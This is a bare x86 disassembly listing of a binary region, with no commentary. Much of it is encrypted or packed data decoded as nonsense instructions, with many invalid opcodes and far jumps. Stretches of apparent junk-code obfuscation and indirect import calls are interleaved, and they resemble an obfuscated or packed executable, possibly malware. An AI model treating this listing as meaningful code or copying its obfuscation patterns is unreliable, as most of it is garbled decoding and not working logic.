  41c205:	arpl   WORD PTR [edx+ecx*1-0x7b],cx
  41c209:	push   eax
  41c20a:	lea    esi,[edi+0x69]
  41c20d:	jb     0x41c241
  41c20f:	(bad)  
  41c211:	xchg   ecx,eax
  41c212:	cmp    eax,0x5236a306
  41c217:	mov    ebx,ss
  41c219:	(bad)  
  41c21a:	adc    eax,0x473ce527
  41c21f:	push   edx
  41c220:	in     eax,0x23
  41c222:	jbe    0x41c297
  41c224:	add    ebx,ebx
  41c226:	pushf  
  41c227:	mov    edx,0xb85eb78
  41c22c:	lds    eax,FWORD PTR [ebp+0x5bf1a15e]
  41c232:	out    dx,eax
  41c233:	std    
  41c234:	ins    DWORD PTR es:[edi],dx
  41c235:	arpl   WORD PTR [ecx],ax
  41c237:	xchg   edi,eax
  41c238:	mov    ecx,0x391a46c1
  41c23d:	and    edi,esp
  41c23f:	fwait
  41c240:	push   edx
  41c241:	test   eax,0x6ef77ec6
  41c246:	pop    ebp
  41c247:	pop    ebx
  41c248:	push   cs
  41c249:	call   0x132a:0xc4d4f624
  41c250:	push   es
  41c251:	stos   BYTE PTR es:[edi],al
  41c252:	mov    al,ds:0x938b25eb
  41c257:	xchg   esp,eax
  41c258:	mov    dl,0xe1
  41c25a:	leave  
  41c25b:	and    DWORD PTR [ebp+0x5a81d9e],edx
  41c261:	cmp    BYTE PTR [eax-0x23ebf21f],dl
  41c267:	inc    esi
  41c268:	adc    bl,BYTE PTR [ecx-0x10]
  41c26b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c26c:	test   eax,0x460a7f83
  41c271:	xchg   ecx,eax
  41c272:	loope  0x41c2ad
  41c274:	std    
  41c275:	das    
  41c276:	mov    ecx,fs
  41c278:	es jns 0x41c2b4
  41c27b:	ret    
  41c27c:	in     eax,dx
  41c27d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c27e:	retf   
  41c27f:	xchg   ebp,eax
  41c280:	sub    eax,edx
  41c282:	ins    DWORD PTR es:[edi],dx
  41c283:	cmp    ebx,edx
  41c285:	ss std 
  41c287:	add    cl,BYTE PTR [ebx+0x35]
  41c28a:	add    BYTE PTR [edi+0x11ee95e0],0x11
  41c291:	lods   eax,DWORD PTR ds:[esi]
  41c292:	aad    0x25
  41c294:	jecxz  0x41c223
  41c296:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c297:	jmp    DWORD PTR [esi]
  41c299:	js     0x41c2f0
  41c29b:	sbb    eax,0xa6955faa
  41c2a0:	cvtps2pi mm7,QWORD PTR es:[esi]
  41c2a4:	sub    eax,0xd685efae
  41c2a9:	mov    al,ds:0xc625850e
  41c2ae:	and    ecx,DWORD PTR [ebp-0x55]
  41c2b1:	mov    ah,0xcd
  41c2b3:	das    
  41c2b4:	adc    al,0xe2
  41c2b6:	sub    al,0x5
  41c2b8:	cmp    eax,0xacc7e64f
  41c2bd:	jle    0x41c248
  41c2bf:	jb     0x41c2e0
  41c2c1:	jne    0x41c2fb
  41c2c3:	mov    edi,0x418ed918
  41c2c8:	out    dx,al
  41c2c9:	sbb    al,0xb
  41c2cb:	loop   0x41c25e
  41c2cd:	dec    ebx
  41c2ce:	mov    bl,0x7d
  41c2d0:	scas   eax,DWORD PTR es:[edi]
  41c2d1:	push   eax
  41c2d2:	out    dx,al
  41c2d3:	sbb    bl,BYTE PTR [eax+esi*8]
  41c2d6:	fsubr  QWORD PTR [edx]
  41c2d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2d9:	fld    DWORD PTR [ebp+ebp*4-0x7b]
  41c2dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2de:	xor    BYTE PTR [ebp-0x6f971a9a],ah
  41c2e4:	add    DWORD PTR [eax+0x6f],ebp
  41c2e7:	lods   al,BYTE PTR ds:[esi]
  41c2e8:	jl     0x41c354
  41c2ea:	inc    edi
  41c2eb:	sbb    al,0x1a
  41c2ed:	xor    esp,DWORD PTR [ebx-0x2164da1d]
  41c2f3:	pusha  
  41c2f4:	jle    0x41c360
  41c2f6:	int3   
  41c2f7:	or     DWORD PTR [ecx],esp
  41c2f9:	xlat   BYTE PTR ds:[ebx]
  41c2fa:	or     BYTE PTR [edx-0x1428f30c],0x82
  41c301:	or     BYTE PTR [ebx+0x7adee917],bh
  41c307:	sub    DWORD PTR [esi],ebp
  41c309:	jbe    0x41c2a3
  41c30b:	or     al,0x79
  41c30d:	fs pop eax
  41c30f:	(bad)  
  41c310:	jmp    0xb115:0x218f2a3
  41c317:	mov    gs,ebp
  41c319:	in     eax,dx
  41c31a:	jl     0x41c351
  41c31c:	mov    WORD PTR [esi+0x0],ds
  41c31f:	add    BYTE PTR [ecx+0x3d19b845],cl
  41c325:	add    eax,0xc7004285
  41c32a:	test   esp,eax
  41c32c:	(bad)  
  41c32d:	(bad)  
  41c32e:	call   FWORD PTR [eax]
  41c330:	jnp    0x41c332
  41c332:	add    bh,al
  41c334:	test   eax,ecx
  41c336:	(bad)  
  41c337:	(bad)  
  41c338:	jmp    FWORD PTR [ecx+0x11]
  41c33b:	add    BYTE PTR [eax],al
  41c33d:	mov    DWORD PTR [ebp-0x12c],0x1379
  41c347:	sbb    DWORD PTR ds:0x428575,ecx
  41c34d:	mov    eax,DWORD PTR [ebp-0x12c]
  41c353:	adc    DWORD PTR ds:0x4284e9,0x44e5
  41c35d:	mov    ecx,0x5856
  41c362:	sub    ecx,eax
  41c364:	and    DWORD PTR ds:0x428445,ecx
  41c36a:	shr    ecx,0x2
  41c36d:	cmp    DWORD PTR ds:0x42858d,0x0
  41c374:	mov    DWORD PTR ds:0x428439,0x1c8e
  41c37e:	mov    DWORD PTR ds:0x428519,0x3a72
  41c388:	mov    DWORD PTR ds:0x42835d,0x2994
  41c392:	jmp    0x41c475
  41c397:	mov    eax,ds:0x4284fd
  41c39c:	cmp    DWORD PTR ds:0x42858d,0x0
  41c3a3:	jge    0x41c3d2
  41c3a9:	push   DWORD PTR [ebp-0x20]
  41c3ac:	push   DWORD PTR [ebp-0x24]
  41c3af:	push   DWORD PTR [ebp-0x1c]
  41c3b2:	call   DWORD PTR ds:0x42e120
  41c3b8:	and    DWORD PTR ds:0x428429,edx
  41c3be:	sub    DWORD PTR ds:0x428389,0x53c2
  41c3c8:	and    DWORD PTR ds:0x42838d,0x428599
  41c3d2:	or     DWORD PTR ds:0x428569,edi
  41c3d8:	sbb    DWORD PTR ds:0x428385,0x428575
  41c3e2:	cmp    DWORD PTR ds:0x428491,0x0
  41c3e9:	mov    DWORD PTR ds:0x428461,0x3b49
  41c3f3:	mov    DWORD PTR ds:0x428471,0x7933
  41c3fd:	mov    DWORD PTR ds:0x428485,0x897
  41c407:	mov    DWORD PTR ds:0x428379,0x5a92
  41c411:	jmp    0x41c475
  41c416:	mov    eax,0x55e0
  41c41b:	movzx  eax,WORD PTR ds:0x4284ed
  41c422:	cmp    DWORD PTR ds:0x428491,0x0
  41c429:	ja     0x41c45f
  41c42f:	push   DWORD PTR [ebp-0x18]
  41c432:	push   DWORD PTR [ebp-0x18]
  41c435:	push   DWORD PTR [ebp-0x18]
  41c438:	push   DWORD PTR [ebp-0x20]
  41c43b:	push   0x8c53
  41c440:	push   DWORD PTR [ebp-0x14]
  41c443:	call   DWORD PTR ds:0x42e068
  41c449:	add    DWORD PTR ds:0x428425,ecx
  41c44f:	not    DWORD PTR ds:0x4284f9
  41c455:	adc    DWORD PTR ds:0x428469,0x2c56
  41c45f:	add    DWORD PTR ds:0x428515,0x42844d
  41c469:	add    DWORD PTR ds:0x42842d,edi
  41c46f:	sub    DWORD PTR ds:0x42849d,edx
  41c475:	sub    ecx,0x5be6
  41c47b:	mov    eax,DWORD PTR [ebp-0x138]
  41c481:	xor    DWORD PTR ds:0x428455,0x2de
  41c48b:	imul   ecx,eax
  41c48e:	mov    eax,ds:0x428485
  41c493:	add    DWORD PTR ds:0x42859d,eax
  41c499:	mov    eax,DWORD PTR [ebp-0x13c]
  41c49f:	and    ecx,eax
  41c4a1:	cmp    DWORD PTR ds:0x428599,0x0
  41c4a8:	mov    DWORD PTR ds:0x42847d,0x420b
  41c4b2:	mov    DWORD PTR ds:0x4284f9,0x3ab4
  41c4bc:	mov    DWORD PTR ds:0x428499,0x3618
  41c4c6:	jmp    0x41c90c
  41c4cb:	mov    DWORD PTR ds:0x428439,0xf37
  41c4d5:	not    eax
  41c4d7:	cmp    DWORD PTR ds:0x428599,0x0
  41c4de:	jg     0x41c505
  41c4e4:	push   0x2612
  41c4e9:	push   DWORD PTR [ebp-0x1c]
  41c4ec:	push   DWORD PTR [ebp-0x14]
  41c4ef:	call   DWORD PTR ds:0x42e06c
  41c4f5:	and    DWORD PTR ds:0x428479,0x428509
  41c4ff:	add    DWORD PTR ds:0x42836d,edi
  41c505:	xor    DWORD PTR ds:0x42843d,edx
  41c50b:	sbb    DWORD PTR ds:0x428485,0x428475
  41c515:	mov    DWORD PTR ds:0x428499,0x491d
  41c51f:	add    DWORD PTR ds:0x428371,ebx
  41c525:	jmp    0x41c90c
  41c52a:	sub    ch,BYTE PTR [esi-0x62]
  41c52d:	sbb    DWORD PTR [edx-0x7c9145e7],edi
  41c533:	pop    ebp
  41c534:	and    al,0x9e
  41c536:	sbb    al,BYTE PTR ds:0x416090df
  41c53c:	sar    BYTE PTR [esi-0x41413bb6],0xe8
  41c543:	fadd   DWORD PTR [ecx-0x3c]
  41c546:	test   BYTE PTR [ebx-0x7d4ba03c],ah
  41c54c:	cmp    eax,0xf1b7db97
  41c551:	sar    BYTE PTR [edi+0x7],0x32
  41c555:	scas   eax,DWORD PTR es:[edi]
  41c556:	add    ebx,DWORD PTR [ebx]
  41c558:	mov    ebx,0x14734abe
  41c55d:	jns    0x41c576
  41c55f:	ins    BYTE PTR es:[edi],dx
  41c560:	cli    
  41c561:	xor    BYTE PTR [ecx],bh
  41c563:	aaa    
  41c564:	out    dx,al
  41c565:	push   ecx
  41c566:	xchg   edx,eax
  41c567:	dec    ecx
  41c568:	ja     0x41c5a0
  41c56a:	pop    ss
  41c56b:	push   edx
  41c56c:	ds loopne 0x41c594
  41c56f:	mov    bl,0x91
  41c571:	add    BYTE PTR [ebp-0x3304d511],0x1e
  41c578:	leave  
  41c579:	adc    dh,dl
  41c57b:	sub    BYTE PTR [edi-0x2a9d7f86],al
  41c581:	pushf  
  41c582:	mov    ah,0x6b
  41c584:	std    
  41c585:	or     edi,DWORD PTR [edx+0x6c]
  41c588:	jmp    0x47e2ffe6
  41c58d:	mov    eax,0xa0111ccb
  41c592:	mov    dh,0xba
  41c594:	iret   
  41c595:	mov    dl,dh
  41c597:	push   esp
  41c598:	(bad)  
  41c599:	push   eax
  41c59a:	mov    ah,0xf0
  41c59c:	mov    ecx,ds
  41c59e:	dec    ebp
  41c59f:	add    al,0xf
  41c5a1:	mov    eax,ds:0x99fa079d
  41c5a6:	adc    eax,0xb578657c
  41c5ab:	mov    al,BYTE PTR [edi+0x28]
  41c5ae:	push   edx
  41c5af:	lods   eax,DWORD PTR ds:[esi]
  41c5b0:	push   es
  41c5b1:	fisub  DWORD PTR [edx]
  41c5b3:	shl    DWORD PTR [edi-0x73929c31],1
  41c5b9:	cmc    
  41c5ba:	not    BYTE PTR [ebx-0x7a]
  41c5bd:	dec    ecx
  41c5be:	push   ebx
  41c5bf:	stos   BYTE PTR es:[edi],al
  41c5c0:	and    eax,0x9810352f
  41c5c5:	or     eax,0x30ad60f6
  41c5ca:	test   BYTE PTR [edx+0x40],0x97
  41c5ce:	int3   
  41c5cf:	mov    edx,0xc474293d
  41c5d4:	or     al,0x0
  41c5d6:	jg     0x41c55e
  41c5d8:	sub    dh,BYTE PTR [edx-0x15c06d6f]
  41c5de:	out    dx,eax
  41c5df:	repz jl 0x41c5a8
  41c5e2:	mov    bh,0x92
  41c5e4:	jae    0x41c5b6
  41c5e6:	in     al,0xd1
  41c5e8:	pushf  
  41c5e9:	add    DWORD PTR [eax+0x61d3445f],esi
  41c5ef:	pop    eax
  41c5f0:	jle    0x41c634
  41c5f2:	add    ebp,ecx
  41c5f4:	xchg   ecx,eax
  41c5f5:	inc    ecx
  41c5f6:	adc    DWORD PTR [edx-0x50acf02d],esi
  41c5fc:	mov    ecx,DWORD PTR [eax+0x1c4e55b5]
  41c602:	inc    edi
  41c603:	xchg   edi,eax
  41c604:	(bad)  
  41c605:	icebp  
  41c606:	mov    ch,0x7c
  41c608:	mov    al,0x4b
  41c60a:	out    0x37,eax
  41c60c:	jbe    0x41c5a8
  41c60e:	pop    ecx
  41c60f:	fiadd  WORD PTR [eax-0x7c]
  41c612:	mov    dl,0xea
  41c614:	packssdw mm6,QWORD PTR [edi]
  41c617:	cmp    eax,0xccd803ce
  41c61c:	loope  0x41c65d
  41c61e:	xchg   ebx,eax
  41c61f:	mov    al,ds:0xf80814f9
  41c624:	mov    ah,0xc7
  41c626:	adc    edx,DWORD PTR [ecx]
  41c628:	int3   
  41c629:	arpl   WORD PTR [edi+eax*2],bx
  41c62c:	rcl    DWORD PTR [esi+esi*4+0x4e],1
  41c630:	mov    DWORD PTR [edx],ecx
  41c632:	mov    edi,0x8db6ec55
  41c637:	pop    ds
  41c638:	xor    DWORD PTR [edi-0xd],ebx
  41c63b:	inc    ebp
  41c63c:	lock xchg DWORD PTR [edx],ebp
  41c63f:	scas   eax,DWORD PTR es:[edi]
  41c640:	mov    ebp,0x627e5231
  41c645:	dec    edx
  41c646:	pop    esp
  41c647:	je     0x41c5f9
  41c649:	lock nop
  41c64b:	inc    ebp
  41c64c:	mul    BYTE PTR ds:0x4eca3f82
  41c652:	ret    
  41c653:	enter  0x595e,0xc3
  41c657:	adc    ebp,ebx
  41c659:	int3   
  41c65a:	mov    al,0x95
  41c65c:	leave  
  41c65d:	dec    ecx
  41c65e:	mov    ah,0xfd
  41c660:	int    0x7a
  41c662:	adc    esp,ebp
  41c664:	mov    ecx,0xa75b8ffb
  41c669:	in     al,dx
  41c66a:	pop    ecx
  41c66b:	and    ah,dl
  41c66d:	cdq    
  41c66e:	into   
  41c66f:	jmp    0xd2b6f9b7
  41c674:	and    dh,dh
  41c676:	fcmove st,st(6)
  41c678:	ficomp WORD PTR [esi]
  41c67a:	mov    esp,0xba882077
  41c67f:	aaa    
  41c680:	iret   
  41c681:	inc    ebp
  41c682:	add    eax,0xac07868
  41c687:	les    ecx,FWORD PTR [edi+0x35f6e974]
  41c68d:	sbb    al,0x77
  41c68f:	iret   
  41c690:	push   cs
  41c691:	repz push cs
  41c693:	out    0xbd,eax
  41c695:	jo     0x41c6c8
  41c697:	xchg   ebx,eax
  41c698:	je     0x41c66a
  41c69a:	test   DWORD PTR [ecx+0x2a7512b],esp
  41c6a0:	sahf   
  41c6a1:	cwd    
  41c6a3:	and    edi,DWORD PTR [ebx+0x7ba97d5d]
  41c6a9:	and    al,0x2a
  41c6ab:	outs   dx,BYTE PTR ds:[esi]
  41c6ac:	loopne 0x41c707
  41c6ae:	retf   
  41c6af:	pop    esp
  41c6b0:	sub    al,0x60
  41c6b2:	jmp    0x19f5:0xe9b869fa
  41c6b9:	pop    ebx
  41c6ba:	dec    edx
  41c6bb:	push   esi
  41c6bc:	push   cs
  41c6bd:	push   ebp
  41c6be:	jno    0x41c709
  41c6c0:	in     al,0x86
  41c6c2:	cld    
  41c6c3:	pop    edx
  41c6c4:	loopne 0x41c6f3
  41c6c6:	xor    BYTE PTR [eax-0x54],cl
  41c6c9:	jmp    0x895c177a
  41c6ce:	push   eax
  41c6cf:	mov    ch,0x43
  41c6d1:	dec    esi
  41c6d2:	jmp    0xfe97c558
  41c6d7:	xchg   esp,eax
  41c6d8:	xchg   esi,eax
  41c6d9:	xor    edx,0x49f94e0e
  41c6df:	jne    0x41c6ea
  41c6e1:	xor    ecx,DWORD PTR [ecx+0x2bf316e2]
  41c6e7:	ret    0x30eb
  41c6ea:	inc    DWORD PTR [edx+0x10949c87]
  41c6f0:	cdq    
  41c6f1:	mov    ds:0xe16ed42,al
  41c6f6:	and    ah,bl
  41c6f8:	mov    ah,0x6c
  41c6fa:	int3   
  41c6fb:	xchg   esi,eax
  41c6fc:	xor    DWORD PTR [ebx+0x2bb9bad8],eax
  41c702:	pop    ds
  41c703:	dec    edx
  41c704:	pop    edx
  41c705:	enter  0xd307,0x78
  41c709:	scas   eax,DWORD PTR es:[edi]
  41c70a:	push   ss
  41c70b:	push   ecx
  41c70c:	or     eax,0x7af04fa9
  41c711:	int3   
  41c712:	fsubp  st(7),st
  41c714:	nop
  41c715:	(bad)  [ecx-0x45072c4c]
  41c71b:	mov    dl,0xec
  41c71d:	in     al,0xd1
  41c71f:	repz ret 0xfff9
  41c723:	mov    eax,ds:0xe8ba5ba9
  41c728:	push   esp
  41c729:	cld    
  41c72a:	xchg   BYTE PTR [eax+eiz*4+0x7b],cl
  41c72e:	dec    ecx
  41c72f:	sub    eax,0xf5edfc7f
  41c734:	call   0x1f7b856c
  41c739:	push   ss
  41c73a:	mov    ds:0x587c8cfa,al
  41c73f:	stc    
  41c740:	push   ebp
  41c741:	mov    esi,0x4bb69e63
  41c746:	scas   al,BYTE PTR es:[edi]
  41c747:	iret   
  41c748:	stc    
  41c749:	ds jle 0x41c6fe
  41c74c:	jmp    0x52881aa5
  41c751:	or     dh,ch
  41c753:	retf   
  41c754:	inc    BYTE PTR [edx+0x39]
  41c757:	cld    
  41c758:	inc    esi
  41c759:	fs cld 
  41c75b:	cdq    
  41c75c:	add    ch,ah
  41c75e:	pop    edx
  41c75f:	dec    esp
  41c760:	pop    ds
  41c761:	shl    BYTE PTR [ebx+0x3eca6b20],0xc4
  41c768:	out    dx,eax
  41c769:	inc    ebp
  41c76a:	int    0x2b
  41c76c:	mov    dl,0x93
  41c76e:	mov    ecx,0x4cce9b79
  41c773:	ds sbb eax,0x4cf21149
  41c779:	fisttp QWORD PTR ss:[esi]
  41c77c:	xor    al,BYTE PTR [ecx]
  41c77e:	int3   
  41c77f:	mov    bl,0x89
  41c781:	add    ebx,ecx
  41c783:	jb     0x41c7fd
  41c785:	addr16 push ds
  41c787:	cmp    esi,DWORD PTR [eax]
  41c789:	retf   
  41c78a:	cli    
  41c78b:	xor    esi,DWORD PTR [esi-0x57567afe]
  41c791:	ja     0x41c766
  41c793:	(bad)  
  41c794:	cmp    BYTE PTR [esp+edi*1+0x5fd9d5cf],cl
  41c79b:	icebp  
  41c79c:	fsubr  QWORD PTR [eax+eax*8-0x3dc3d665]
  41c7a3:	jno    0x41c79a
  41c7a5:	sbb    DWORD PTR [ebp+0x4b],ebx
  41c7a8:	cmp    BYTE PTR [eax],ah
  41c7aa:	push   eax
  41c7ab:	adc    BYTE PTR [eax+0x30],al
  41c7ae:	jnp    0x41c759
  41c7b0:	xchg   ecx,eax
  41c7b1:	lea    esi,[eax*4+0x25f18f6f]
  41c7b8:	mov    bl,0xf8
  41c7ba:	cs pop ds
  41c7bc:	enter  0xa871,0x67
  41c7c0:	dec    esp
  41c7c1:	jle    0x41c7b8
  41c7c3:	mov    ds:0xc68d6208,eax
  41c7c8:	dec    edx
  41c7c9:	mov    ch,0x3d
  41c7cb:	sub    cl,BYTE PTR cs:[eax-0x7b7f8ab9]
  41c7d2:	scas   eax,DWORD PTR es:[edi]
  41c7d3:	popf   
  41c7d4:	aam    0x56
  41c7d6:	xor    BYTE PTR [edx-0x654870a9],bl
  41c7dc:	into   
  41c7dd:	pop    ecx
  41c7de:	lods   al,BYTE PTR ds:[esi]
  41c7df:	mov    al,0xa2
  41c7e1:	push   ds
  41c7e2:	inc    esi
  41c7e3:	scas   al,BYTE PTR es:[edi]
  41c7e4:	pop    ecx
  41c7e5:	cmp    al,0x26
  41c7e7:	dec    esp
  41c7e8:	push   cs
  41c7e9:	inc    ebp
  41c7ea:	sub    esi,0xfffffff8
  41c7ed:	dec    eax
  41c7ee:	cmp    ah,BYTE PTR [ebx]
  41c7f0:	cmp    DWORD PTR [esi+0x5b1397c5],ecx
  41c7f6:	dec    ecx
  41c7f7:	ds arpl di,bx
  41c7fa:	(bad)  
  41c7fb:	sub    edx,DWORD PTR [esi]
  41c7fd:	sbb    al,0x12
  41c7ff:	shr    DWORD PTR [ebp-0x19],0xbf
  41c803:	and    DWORD PTR [edx],ebx
  41c805:	movsx  edi,BYTE PTR [ecx+0x777c497a]
  41c80c:	sbb    DWORD PTR [ebp-0x7e],ebx
  41c80f:	int3   
  41c810:	das    
  41c811:	ins    BYTE PTR es:[edi],dx
  41c812:	cli    
  41c813:	jae    0x41c7c9
  41c815:	inc    esp
  41c816:	cs inc edx
  41c818:	pop    ds
  41c819:	int3   
  41c81a:	sub    DWORD PTR [ebx],0xefa8fac4
  41c820:	and    ebx,DWORD PTR [eax-0x41bcdb8e]
  41c826:	lahf   
  41c827:	cwde   
  41c828:	push   0xffffff9e
  41c82a:	cmc    
  41c82b:	loopne 0x41c808
  41c82d:	mov    edi,0xff3a5b9
  41c832:	repz cmp edx,DWORD PTR ds:0x649bf49e
  41c839:	lahf   
  41c83a:	push   ebx
  41c83b:	iret   
  41c83c:	mov    ah,0xe1
  41c83e:	and    ebp,edx
  41c840:	mov    esi,0xb4019984
  41c845:	ret    0x9a3c
  41c848:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c849:	mov    dh,0x95
  41c84b:	sub    eax,edx
  41c84d:	aam    0xed
  41c84f:	cld    
  41c850:	xor    ecx,DWORD PTR [esi+0x65]
  41c853:	mov    esi,0x9dcf0c27
  41c858:	fisubr WORD PTR [eax+0x6f7aaee1]
  41c85e:	popf   
  41c85f:	cmp    al,0x75
  41c861:	and    al,0x5f
  41c863:	xchg   edi,eax
  41c864:	dec    eax
  41c865:	xor    DWORD PTR [eax],0xffffff8c
  41c868:	push   0xffffffd7
  41c86a:	or     eax,0x401ae650
  41c86f:	pop    edi
  41c870:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c871:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c872:	or     eax,0x95b3f680
  41c877:	mov    ebp,0x85f6045f
  41c87c:	bound  ebp,QWORD PTR [esi+0x38d1e460]
  41c882:	inc    esi
  41c883:	or     al,0xf0
  41c885:	or     esi,edi
  41c887:	loop   0x41c87a
  41c889:	popf   
  41c88a:	or     dh,ah
  41c88c:	sbb    BYTE PTR [ebp+eax*2+0x21f30eb3],0x54
  41c894:	sub    eax,0x36f57f4b
  41c899:	add    BYTE PTR [eax+ebx*4],dl
  41c89c:	daa    
  41c89d:	jno    0x41c879
  41c89f:	push   ds
  41c8a0:	es (bad) 
  41c8a2:	fcmovnb st,st(2)
  41c8a4:	jns    0x41c894
  41c8a6:	xchg   edx,eax
  41c8a7:	mov    esp,0x533acb6b
  41c8ac:	mov    ch,0x50
  41c8ae:	push   ds
  41c8af:	call   0xd845:0xb6c4bb1a
  41c8b6:	jge    0x41c89b
  41c8b8:	cs jbe 0x41c8e3
  41c8bb:	add    eax,0x817553b0
  41c8c0:	out    0x8,al
  41c8c2:	stos   BYTE PTR es:[edi],al
  41c8c3:	inc    edi
  41c8c4:	xchg   ebx,eax
  41c8c5:	add    bh,BYTE PTR [ebp+0x5143723a]
  41c8cb:	jecxz  0x41c949
  41c8cd:	add    eax,0xd702b7b4
  41c8d2:	(bad)  
  41c8d3:	fsub   DWORD PTR [ebx+0x3c6edc3b]
  41c8d9:	shl    DWORD PTR [eax+eax*8+0x5f63b895],0x73
  41c8e1:	jge    0x41c875
  41c8e3:	or     al,0x51
  41c8e5:	pop    ds
  41c8e6:	div    DWORD PTR [eax+0x68]
  41c8e9:	shl    BYTE PTR [esi-0x5f9dee14],cl
  41c8ef:	mov    ?,edx
  41c8f1:	pop    ds
  41c8f2:	jmp    0xdc411b0e
  41c8f7:	mov    ds:0xd5c97f32,al
  41c8fc:	xlat   BYTE PTR ds:[ebx]
  41c8fd:	dec    eax
  41c8fe:	or     DWORD PTR [ebp+0x7fd6ff09],ebx
  41c904:	popf   
  41c905:	add    BYTE PTR [edx],0x47
  41c908:	inc    ebp
  41c909:	dec    esp
  41c90a:	mov    edx,0x3b18b8df
  41c90f:	add    BYTE PTR [eax],al
  41c911:	or     DWORD PTR ds:0x42859d,0x428435
  41c91b:	sub    eax,ecx
  41c91d:	mov    ecx,DWORD PTR ds:0x42849d
  41c923:	sbb    ecx,DWORD PTR ds:0x4284f9
  41c929:	mov    DWORD PTR ds:0x42849d,ecx
  41c92f:	mov    DWORD PTR [ebp-0xfc],eax
  41c935:	movzx  eax,BYTE PTR ds:0x428379
  41c93c:	sub    eax,DWORD PTR ds:0x428359
  41c942:	mov    ds:0x428379,eax
  41c947:	mov    DWORD PTR [ebp-0x28],0x16d7
  41c94e:	mov    DWORD PTR [ebp-0x134],0x6b4
  41c958:	mov    eax,DWORD PTR [ebp-0x134]
  41c95e:	cmp    DWORD PTR ds:0x42859d,0x0
  41c965:	mov    ecx,0x4723
  41c96a:	mov    DWORD PTR ds:0x428361,0x48a0
  41c974:	jmp    0x41c9c9
  41c979:	mov    ecx,0x5cee
  41c97e:	cmp    DWORD PTR ds:0x42859d,0x0
  41c985:	jl     0x41c9b9
  41c98b:	push   0x8e3c
  41c990:	call   DWORD PTR ds:0x42e070
  41c996:	movzx  ecx,BYTE PTR ds:0x42849d
  41c99d:	sbb    DWORD PTR ds:0x428489,ecx
  41c9a3:	xor    DWORD PTR ds:0x42858d,edx
  41c9a9:	mov    DWORD PTR ds:0x428501,0x54fa
  41c9b3:	adc    DWORD PTR ds:0x428475,ebx
  41c9b9:	xor    ecx,DWORD PTR ds:0x428585
  41c9bf:	sub    DWORD PTR ds:0x428451,0x73c7
  41c9c9:	or     eax,0x4f70
  41c9ce:	cmp    DWORD PTR ds:0x42844d,0x0
  41c9d5:	mov    ecx,0x6758
  41c9da:	mov    ecx,0x329e
  41c9df:	mov    DWORD PTR ds:0x4284e5,ecx
  41c9e5:	mov    DWORD PTR ds:0x428489,edi
  41c9eb:	jmp    0x41ca37
  41c9f0:	mov    DWORD PTR ds:0x428385,0x5f4d
  41c9fa:	cmp    DWORD PTR ds:0x42844d,0x0
  41ca01:	jae    0x41ca29
  41ca07:	push   0x67b2
  41ca0c:	push   0x4f13
  41ca11:	call   DWORD PTR ds:0x42e074
  41ca17:	add    ecx,0x3ae9
  41ca1d:	sub    ecx,DWORD PTR ds:0x428379
  41ca23:	xor    ecx,DWORD PTR ds:0x42844d
  41ca29:	adc    DWORD PTR ds:0x42834d,ecx
  41ca2f:	adc    ecx,DWORD PTR ds:0x42844d
  41ca35:	not    ecx
  41ca37:	mov    ecx,DWORD PTR [ebp-0x28]
  41ca3a:	or     DWORD PTR ds:0x42849d,0x428481
  41ca44:	or     eax,ecx
  41ca46:	xor    ecx,ecx
  41ca48:	xor    ecx,DWORD PTR ds:0x428381
  41ca4e:	xor    DWORD PTR ds:0x428571,ecx
  41ca54:	sub    eax,0x5ff7
  41ca59:	mov    ecx,DWORD PTR ds:0x428379
  41ca5f:	sub    ecx,DWORD PTR ds:0x428509
  41ca65:	mov    DWORD PTR ds:0x428379,ecx
  41ca6b:	mov    DWORD PTR [ebp-0xc8],eax
  41ca71:	sub    DWORD PTR ds:0x428521,0xac
  41ca7b:	mov    DWORD PTR [ebp-0xe4],0x5f39
  41ca85:	cmp    DWORD PTR ds:0x428465,0x0
  41ca8c:	mov    DWORD PTR ds:0x428371,edi
  41ca92:	mov    DWORD PTR ds:0x42843d,edx
  41ca98:	jmp    0x41cafc
  41ca9d:	mov    DWORD PTR ds:0x428449,edx
  41caa3:	mov    DWORD PTR ds:0x428519,ebx
  41caa9:	cmp    DWORD PTR ds:0x428465,0x0
  41cab0:	jbe    0x41cad5
  41cab6:	push   DWORD PTR [ebp-0x1c]
  41cab9:	call   DWORD PTR ds:0x42e128
  41cabf:	sub    DWORD PTR ds:0x428521,edi
  41cac5:	xor    ecx,ecx
  41cac7:	add    ecx,DWORD PTR ds:0x4285b1
  41cacd:	mov    ecx,DWORD PTR [ecx]
  41cacf:	adc    DWORD PTR ds:0x42847d,ecx
  41cad5:	and    ecx,DWORD PTR ds:0x428571
  41cadb:	sub    ecx,ecx
  41cadd:	xor    ecx,ecx
  41cadf:	or     ecx,DWORD PTR ds:0x428579
  41cae5:	and    ecx,DWORD PTR ds:0x428481
  41caeb:	mov    DWORD PTR ds:0x428579,ecx
  41caf1:	adc    ecx,DWORD PTR ds:0x428429
  41caf7:	or     eax,0x53d3
  41cafc:	mov    DWORD PTR [ebp-0xc4],0x6236
  41cb06:	mov    DWORD PTR [ebp-0x7c],0x6ce7
  41cb0d:	jmp    0x41cef4
  41cb12:	pop    ebx
  41cb13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb14:	jmp    0x31aa:0x7b9c3cd8
  41cb1b:	add    al,0x9a
  41cb1d:	jecxz  0x41cb03
  41cb1f:	mov    dh,0xe3
  41cb21:	nop
  41cb22:	jmp    0x41cb6d
  41cb24:	sar    BYTE PTR [esi-0x41413bb6],0x80
  41cb2b:	fwait
  41cb2c:	dec    edi
  41cb2d:	les    esp,FWORD PTR [edx]
  41cb2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb30:	fild   WORD PTR [eax+0x1a]
  41cb33:	in     al,dx
  41cb34:	inc    ecx
  41cb35:	(bad)  
  41cb37:	and    esp,DWORD PTR [edx-0x73]
  41cb3a:	or     ch,BYTE PTR [ebx-0x48]
  41cb3d:	sbb    ch,BYTE PTR [edi]
  41cb3f:	ins    DWORD PTR es:[edi],dx
  41cb40:	fild   QWORD PTR [ebx-0x4634e035]
  41cb46:	fld    TBYTE PTR [esi]
  41cb48:	inc    edi
  41cb49:	fwait
  41cb4a:	ret    
